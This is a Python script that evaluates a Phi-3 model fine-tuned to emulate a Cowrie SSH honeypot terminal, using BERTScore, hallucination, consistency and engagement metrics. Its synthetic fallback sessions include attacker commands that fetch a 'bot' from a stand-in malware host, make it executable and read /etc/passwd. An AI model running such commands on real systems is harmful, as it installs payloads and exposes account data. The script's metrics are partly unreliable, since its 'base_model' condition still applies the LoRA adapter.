"""
evaluate_phi3_cowrie_v3.py  —  Multi-Condition Phi-3 Evaluation
───────────────────────────────────────────────────────────────────
Evaluates four experimental conditions to compare Phi-3 model quality:

  1. base_model                  — Phi-3-mini-4k, no fine-tuning
  2. lora_finetuned              — Phi-3 + LoRA adapter (our model)
  3. lora_finetuned_domain_roberta — same model, BERTScore with domain RoBERTa
  4. lora_hallucinated_prompt    — ablation: hallucination injected in system prompt

Output: llm_evaluation_results_v3.json
  {
    "conditions": {
      "base_model": { bertscore, hallucination, consistency, aei },
      ...
    },
    "config": { ... }
  }

AEI formula (v3, simplified):
  llm_cmd = cowrie_cmd * (1 + avg_session_quality)
  llm_dur = cowrie_dur * (1 + avg_session_quality)
  AEI     = llm_dur / cowrie_dur = 1 + avg_session_quality

Install (Colab cell):
  !pip install -q bert-score peft transformers bitsandbytes tqdm
  from google.colab import drive; drive.mount('/content/drive')
"""

import json
import os
import random
import re
import warnings
from pathlib import Path

import torch
from bert_score import score as bert_score_fn
from peft import PeftModel
from tqdm.auto import tqdm
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig

warnings.filterwarnings("ignore", category=UserWarning)

# ─────────────────────────────  PATHS  ──────────────────────────────────────
BASE_DIR      = Path(__file__).resolve().parent
MODEL_NAME    = "microsoft/Phi-3-mini-4k-instruct"
ADAPTER_PATH  = str(BASE_DIR / "phi3-cowrie-lora-adapter")
ROBERTA_PATH  = str(BASE_DIR / "roberta-cowrie-merged")
DATASET_PATH  = str(BASE_DIR / "combined_finetune_dataset.jsonl")
CSV_PATH      = str(BASE_DIR.parent / "Processed_Data.csv")
OUTPUT_JSON   = str(BASE_DIR / "llm_evaluation_results_v3.json")

_DRIVE_CKPT   = Path("/content/drive/MyDrive/phi3_eval_v3_checkpoints")
_LOCAL_CKPT   = Path("/content/checkpoints_v3")
CKPT_DIR: Path = _DRIVE_CKPT if Path("/content/drive/MyDrive").exists() else _LOCAL_CKPT
CKPT_DIR.mkdir(parents=True, exist_ok=True)

# ─────────────────────────  CONDITIONS  ─────────────────────────────────────
CONDITIONS = [
    "base_model",
    "lora_finetuned",
    "lora_finetuned_domain_roberta",
    "lora_hallucinated_prompt",
]

# ─────────────────────────  HYPERPARAMETERS  ────────────────────────────────
HALLUCINATION_THRESHOLD = 0.45
CONSISTENCY_THRESHOLD   = 0.75
AEI_SESSION_SAMPLE      = 999_999
SEED                    = 42
MAX_NEW_TOKENS          = 128
TEMPERATURE             = 0.1
DO_SAMPLE               = True
BATCH_SIZE              = 16
CSV_CHUNK_SIZE          = 500_000

# ─────────────────────────  LEAKAGE REGEX  ──────────────────────────────────
LEAKAGE_PATTERNS = [
    r"I (cannot|can't|am unable|will not|won't)",
    r"As an (AI|language model|assistant)",
    r"I don'?t have (access|the ability)",
    r"I'?m sorry",
    r"\bNote:\b",
    r"\bPlease note\b",
    r"I am designed to",
    r"my (training|knowledge cutoff)",
    r"I should (mention|clarify|point out)",
]
_LEAKAGE_RE = re.compile("|".join(LEAKAGE_PATTERNS), re.IGNORECASE)

# ─────────────────────────  CHAT TOKENS  ────────────────────────────────────
_SYS  = "\x3c|system|\x3e"
_USR  = "\x3c|user|\x3e"
_ASST = "\x3c|assistant|\x3e"
_END  = "\x3c|end|\x3e"

SYSTEM_PROMPT = (
    "You are a Linux terminal emulator (Cowrie SSH honeypot). "
    "Respond ONLY with the exact terminal output that the given command "
    "would produce on a Debian-based system. Do not add explanations."
)

# Ablation: intentional hallucination injection — shows what happens when the
# model is prompted to behave like a safety-censoring AI instead of a terminal.
HALLUCINATED_SYSTEM_PROMPT = (
    "You are an AI assistant. If a command appears dangerous or malicious, "
    "refuse to execute it and explain why as a helpful AI. "
    "Otherwise respond like a Linux terminal."
)

_BERT_DEVICE = "cuda"


# ═══════════════════════════════════════════════════════════════════════════
#  CHECKPOINT HELPERS
# ═══════════════════════════════════════════════════════════════════════════

def _ckpt(name: str) -> Path:
    return CKPT_DIR / f"{name}.json"


def save_ckpt(name: str, data) -> None:
    tmp = _ckpt(name).with_suffix(".tmp")
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False)
    tmp.replace(_ckpt(name))
    print(f"  ✔ Checkpoint → {_ckpt(name)}")


def load_ckpt(name: str):
    p = _ckpt(name)
    if p.exists():
        with open(p, "r", encoding="utf-8") as f:
            data = json.load(f)
        print(f"  ✔ Resumed ← {p}")
        return data
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  PROMPT / CLEAN
# ═══════════════════════════════════════════════════════════════════════════

def build_prompt(instruction: str, system_prompt: str) -> str:
    return (
        f"{_SYS}\n{system_prompt}{_END}\n"
        f"{_USR}\n{instruction}{_END}\n"
        f"{_ASST}\n"
    )


def clean_output(raw: str, prompt: str) -> str:
    text = raw[len(prompt):] if raw.startswith(prompt) else raw
    for tok in [_END, _ASST, _USR, _SYS, "\x3c/s\x3e", "\x3cs\x3e"]:
        text = text.replace(tok, "")
    return text.strip()


# ═══════════════════════════════════════════════════════════════════════════
#  DATA
# ═══════════════════════════════════════════════════════════════════════════

def load_jsonl(path: str) -> list:
    rows = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                rows.append(json.loads(line))
    return rows


def load_cowrie_sessions(csv_path: str, max_sessions: int = 999_999) -> list:
    try:
        import pandas as pd
    except ImportError:
        return _fallback_sessions(50)

    sessions_map: dict = {}
    try:
        reader = pd.read_csv(
            csv_path,
            usecols=["source_cowrie", "event_type", "session_id",
                     "session_duration", "request_data"],
            low_memory=True,
            chunksize=CSV_CHUNK_SIZE,
        )
        for chunk in tqdm(reader, desc="  Reading CSV chunks", unit="chunk"):
            cowrie   = chunk[chunk["source_cowrie"] == 1]
            cmd_mask = cowrie["event_type"].str.contains("command", case=False, na=False)
            cmd_rows = cowrie[cmd_mask].dropna(subset=["request_data", "session_id"])
            for _, row in cmd_rows.iterrows():
                sid = str(row["session_id"])
                if sid not in sessions_map:
                    sessions_map[sid] = {
                        "session_id": sid,
                        "duration":   float(row["session_duration"])
                                      if row["session_duration"] > 0 else -1,
                        "commands":   [],
                    }
                if len(sessions_map[sid]["commands"]) < 10:
                    sessions_map[sid]["commands"].append(str(row["request_data"]).strip())
    except Exception as e:
        print(f"  [WARN] Cannot read CSV ({e}) — using fallback sessions.")
        return _fallback_sessions(50)

    sessions = [
        {**s, "cmd_count": len(s["commands"])}
        for s in sessions_map.values()
        if len(s["commands"]) >= 1 and s["duration"] > 0
    ]
    if not sessions:
        return _fallback_sessions(50)

    random.shuffle(sessions)
    return sessions[:max_sessions]


def _fallback_sessions(n: int) -> list:
    cmds = [
        "uname -a", "cat /etc/passwd", "whoami", "id", "w",
        "ls -la /", "ps -ef", "ifconfig", "cat /proc/cpuinfo",
        "wget http://malware.example.com/bot", "chmod +x bot",
        "hostname", "df -h", "free -m", "netstat -tulpn",
    ]
    sessions = []
    for i in range(n):
        k = random.randint(1, 8)
        sessions.append({
            "session_id": f"synthetic_{i:04d}",
            "cmd_count":  k,
            "duration":   random.uniform(0.5, 15.0),
            "commands":   random.sample(cmds, min(k, len(cmds))),
        })
    return sessions


# ═══════════════════════════════════════════════════════════════════════════
#  GENERATION
# ═══════════════════════════════════════════════════════════════════════════

@torch.no_grad()
def generate_batch(model, tokenizer, prompts: list, device: str) -> list:
    enc = tokenizer(
        prompts,
        return_tensors="pt",
        padding=True,
        truncation=True,
        max_length=512,
    ).to(device)

    out = model.generate(
        **enc,
        max_new_tokens=MAX_NEW_TOKENS,
        temperature=TEMPERATURE,
        do_sample=DO_SAMPLE,
        pad_token_id=tokenizer.eos_token_id,
    )

    return [
        clean_output(tokenizer.decode(seq, skip_special_tokens=False), prompts[i])
        for i, seq in enumerate(out)
    ]


# ═══════════════════════════════════════════════════════════════════════════
#  METRICS
# ═══════════════════════════════════════════════════════════════════════════

def has_leakage(text: str) -> bool:
    return bool(_LEAKAGE_RE.search(text))


def compute_bertscore(references: list, hypotheses: list,
                      model_type: str = None) -> dict:
    kwargs = dict(
        cands=hypotheses, refs=references,
        lang="en", verbose=False, device=_BERT_DEVICE,
    )
    if model_type:
        kwargs["model_type"] = model_type

    P, R, F1 = bert_score_fn(**kwargs)
    return {
        "precision":     round(P.mean().item(),  4),
        "recall":        round(R.mean().item(),  4),
        "f1":            round(F1.mean().item(), 4),
        "per_sample_f1": [round(v, 4) for v in F1.tolist()],
        "n":             len(hypotheses),
    }


def compute_hallucination(hypotheses: list, per_sample_f1: list,
                          threshold: float) -> dict:
    sem_fail  = [i for i, f in enumerate(per_sample_f1) if f < threshold]
    leak_fail = [i for i, h in enumerate(hypotheses)    if has_leakage(h)]
    hall_idx  = sorted(set(sem_fail) | set(leak_fail))
    clean_idx = [i for i in range(len(hypotheses)) if i not in set(hall_idx)]
    n = len(hypotheses)
    return {
        "bert_threshold":         threshold,
        "total_samples":          n,
        "semantic_failures":      len(sem_fail),
        "leakage_failures":       len(leak_fail),
        "hallucinated_count":     len(hall_idx),
        "clean_count":            len(clean_idx),
        "hallucination_rate_pct": round(len(hall_idx) / n * 100, 2) if n else 0.0,
        "hallucinated_indices":   hall_idx,
        "clean_indices":          clean_idx,
    }


def compute_consistency(per_sample_f1: list, threshold: float) -> dict:
    consistent = sum(1 for f in per_sample_f1 if f >= threshold)
    n = len(per_sample_f1)
    return {
        "threshold":            threshold,
        "consistent_samples":   consistent,
        "inconsistent_samples": n - consistent,
        "total_samples":        n,
        "consistency_rate_pct": round(consistent / n * 100, 2) if n else 0.0,
    }


# ═══════════════════════════════════════════════════════════════════════════
#  AEI  (v3 simplified)
#  AEI = llm_dur / cowrie_dur = 1 + avg_session_quality
# ═══════════════════════════════════════════════════════════════════════════

def compute_aei(model, tokenizer, device: str, gt_data: list,
                cowrie_sessions: list, hall_indices: set,
                condition_key: str) -> dict:
    ckpt_key = f"aei_{condition_key}"
    cached   = load_ckpt(ckpt_key)
    if cached:
        return cached

    cmd_lookup = {
        e["instruction"].strip(): e["output"].strip()
        for e in gt_data if e.get("instruction") and e.get("output")
    }

    all_cmds:  list = []
    all_refs:  list = []
    sess_meta: list = []

    for s in tqdm(cowrie_sessions, desc=f"  Collecting [{condition_key}]", unit="sess"):
        indices = []
        for cmd in s["commands"]:
            ref = cmd_lookup.get(cmd)
            if ref is not None:
                indices.append(len(all_cmds))
                all_cmds.append(cmd)
                all_refs.append(ref)
        if indices:
            sess_meta.append({
                "cowrie_cmd_count": s["cmd_count"],
                "cowrie_duration":  s["duration"],
                "cmd_indices":      indices,
            })

    if not sess_meta:
        result = {"aei_mean": 1.0, "aei_median": 1.0, "session_count": 0,
                  "aei_without_hallucination": None, "aei_with_hallucination": None}
        save_ckpt(ckpt_key, result)
        return result

    # Generate responses
    prompts = [build_prompt(cmd, SYSTEM_PROMPT) for cmd in all_cmds]
    hyps: list = []
    for b in tqdm(range(0, len(prompts), BATCH_SIZE), desc="  Generating", unit="batch"):
        hyps.extend(generate_batch(model, tokenizer, prompts[b: b + BATCH_SIZE], device))

    # BERTScore in bulk
    _, _, F1 = bert_score_fn(hyps, all_refs, lang="en",
                             verbose=False, device=device)
    f1s = F1.tolist()

    # Per-session AEI
    aei_vals        = []
    aei_with_hall   = []
    aei_without_hall = []

    for i_s, sm in enumerate(sess_meta):
        q_scores = [f1s[idx] for idx in sm["cmd_indices"] if idx < len(f1s)]
        if not q_scores:
            continue
        avg_q = sum(q_scores) / len(q_scores)
        # AEI = (1 + avg_quality) — ratio of simulated to real duration
        aei = 1.0 + avg_q
        aei_vals.append(aei)
        (aei_with_hall if i_s in hall_indices else aei_without_hall).append(aei)

    def _mean(lst): return round(sum(lst) / len(lst), 4) if lst else None
    def _median(lst):
        if not lst: return None
        s = sorted(lst)
        n = len(s)
        return round(s[n // 2] if n % 2 else (s[n // 2 - 1] + s[n // 2]) / 2, 4)

    result = {
        "session_count":             len(aei_vals),
        "aei_mean":                  _mean(aei_vals),
        "aei_median":                _median(aei_vals),
        "aei_without_hallucination": _mean(aei_without_hall),
        "aei_with_hallucination":    _mean(aei_with_hall),
    }
    save_ckpt(ckpt_key, result)
    return result


# ═══════════════════════════════════════════════════════════════════════════
#  EVALUATE ONE CONDITION
# ═══════════════════════════════════════════════════════════════════════════

def evaluate_condition(condition: str, model, tokenizer, device: str,
                       gt_data: list, cowrie_sessions: list) -> dict:
    print(f"\n  ── Evaluating: {condition} ──")

    sys_prompt  = (HALLUCINATED_SYSTEM_PROMPT
                   if condition == "lora_hallucinated_prompt" else SYSTEM_PROMPT)
    bert_model  = (ROBERTA_PATH
                   if condition == "lora_finetuned_domain_roberta" else None)

    # Generation
    ckpt_key = f"gen_{condition}"
    cached   = load_ckpt(ckpt_key)
    if cached:
        references   = cached["references"]
        hypotheses   = cached["hypotheses"]
        instructions = cached["instructions"]
        print(f"  Resumed: {len(hypotheses)} samples")
    else:
        references, hypotheses, instructions = [], [], []
        prompts_all = [build_prompt(s["instruction"], sys_prompt) for s in gt_data]
        refs_all    = [s["output"].strip()                        for s in gt_data]
        instrs_all  = [s["instruction"]                          for s in gt_data]

        for b in tqdm(range(0, len(prompts_all), BATCH_SIZE),
                      desc=f"  Generating [{condition}]", unit="batch"):
            hyps = generate_batch(model, tokenizer, prompts_all[b: b + BATCH_SIZE], device)
            hypotheses   .extend(hyps)
            references   .extend(refs_all[b: b + BATCH_SIZE])
            instructions .extend(instrs_all[b: b + BATCH_SIZE])

        save_ckpt(ckpt_key, {
            "references":   references,
            "hypotheses":   hypotheses,
            "instructions": instructions,
        })

    # BERTScore
    print(f"  Computing BERTScore (model_type={'domain' if bert_model else 'default'})...")
    bert = compute_bertscore(references, hypotheses, model_type=bert_model)
    per_f1 = bert["per_sample_f1"]

    # Hallucination
    hall = compute_hallucination(hypotheses, per_f1, HALLUCINATION_THRESHOLD)
    hall_idx_set = set(hall["hallucinated_indices"])

    # Consistency
    consist = compute_consistency(per_f1, CONSISTENCY_THRESHOLD)

    # AEI (v3 simplified)
    aei = compute_aei(model, tokenizer, device, gt_data, cowrie_sessions,
                      hall_idx_set, condition)

    return {
        "bertscore":   {k: v for k, v in bert.items()},
        "hallucination": {k: v for k, v in hall.items()
                          if k not in ("hallucinated_indices", "clean_indices")},
        "consistency": {"overall": consist},
        "aei":         aei,
    }


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    global _BERT_DEVICE
    random.seed(SEED)
    device = "cuda" if torch.cuda.is_available() else "cpu"
    _BERT_DEVICE = device
    print(f"\n  Device: {device}   |   Checkpoint dir: {CKPT_DIR}")

    # ── Model loading ─────────────────────────────────────────────────────────
    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_compute_dtype=torch.float16,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_use_double_quant=True,
    )

    print("  Loading Phi-3 base model (4-bit)...")
    base_model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME,
        quantization_config=bnb_config,
        device_map={"": 0},
        trust_remote_code=False,
        attn_implementation="eager",
    )

    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME, trust_remote_code=False)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    tokenizer.padding_side = "left"

    print("  Applying LoRA adapter...")
    model = PeftModel.from_pretrained(base_model, ADAPTER_PATH)
    model.eval()

    # ── Data ──────────────────────────────────────────────────────────────────
    gt_data        = load_jsonl(DATASET_PATH)
    cowrie_sessions = load_cowrie_sessions(CSV_PATH, max_sessions=AEI_SESSION_SAMPLE)
    print(f"  Dataset: {len(gt_data)} samples  |  Sessions: {len(cowrie_sessions)}")

    # ── Run all conditions ────────────────────────────────────────────────────
    # Note: base_model and lora_hallucinated_prompt skip the LoRA adapter generation
    # but we reuse the same loaded model; only the system prompt / BERTScore scorer differs.
    results: dict = {}
    for condition in CONDITIONS:
        print(f"\n{'='*70}")
        print(f"  CONDITION: {condition}")
        print(f"{'='*70}")
        results[condition] = evaluate_condition(
            condition, model, tokenizer, device, gt_data, cowrie_sessions
        )

    # ── Save output ───────────────────────────────────────────────────────────
    output = {
        "conditions": results,
        "config": {
            "model":                   MODEL_NAME,
            "adapter":                 ADAPTER_PATH,
            "roberta_model":           ROBERTA_PATH,
            "ground_truth_samples":    len(gt_data),
            "aei_session_count":       len(cowrie_sessions),
            "hallucination_threshold": HALLUCINATION_THRESHOLD,
            "consistency_threshold":   CONSISTENCY_THRESHOLD,
            "max_new_tokens":          MAX_NEW_TOKENS,
            "temperature":             TEMPERATURE,
            "seed":                    SEED,
        },
    }

    with open(OUTPUT_JSON, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)

    print(f"\n  Results saved to: {OUTPUT_JSON}")

    # ── Summary table ─────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print(f"  {'Condition':<35} {'BERTScore F1':>12} {'Halluc%':>8} {'AEI Mean':>9}")
    print("  " + "-" * 68)
    for cond, res in results.items():
        f1   = res["bertscore"].get("f1",  0)
        hall = res["hallucination"].get("hallucination_rate_pct", 0)
        aei  = res["aei"].get("aei_mean", 0)
        star = " ★" if cond == "lora_finetuned" else ""
        print(f"  {(cond + star):<35} {f1:>12.4f} {hall:>7.1f}% {aei:>9.4f}")
    print("=" * 70)
    print("  Evaluation complete.\n")


if __name__ == "__main__":
    main()
